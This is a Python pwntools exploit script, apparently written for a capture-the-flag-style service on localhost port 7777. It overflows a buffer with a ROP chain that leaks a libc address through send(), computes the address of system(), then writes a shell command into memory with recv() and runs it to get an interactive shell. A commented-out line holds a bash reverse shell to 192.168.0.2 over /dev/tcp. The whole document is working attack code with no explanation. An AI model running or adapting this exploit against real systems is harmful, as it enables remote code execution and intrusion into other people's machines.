from pwn import *

s1 = remote('localhost', 7777)
s1.recv(1024)

#pth = 'bash -i >& /dev/tcp/192.168.0.2/4000 0>&1'
pth = 'echo bin >&4 ; sh 0<&4 1>&4\0'
raddr = 0x0804a800
saddr = 0x00000000

payload = 'A' * 0x408 + 'B' * 4 

#send(sock, addr, size, flag)
payload += p32(0x08048610)
payload += p32(0)
payload += p32(4)    
payload += p32(0x0804a048)    
payload += p32(4)    
payload += p32(0)

s1.send(payload)

saddr = u32(s1.recv(4)) + (0xf7d96c70 - 0xf7e52880)
s1.close()

s2 = remote('localhost', 7777)
s2.recv(1024)

payload = 'A' * 0x408 + 'B' * 4 

#recv(sock, addr, size, flag)
payload += p32(0x080485f0)
payload += p32(0x080489cc)
payload += p32(4)    
payload += p32(raddr)
payload += p32(len(pth))
payload += p32(0) 

payload += p32(saddr)
payload += p32(0)
payload += p32(raddr)

s2.send(payload)
sleep(0.1)
s2.send(pth)

if s2.recvn(4) == 'bin\n' :
    s2.interactive()
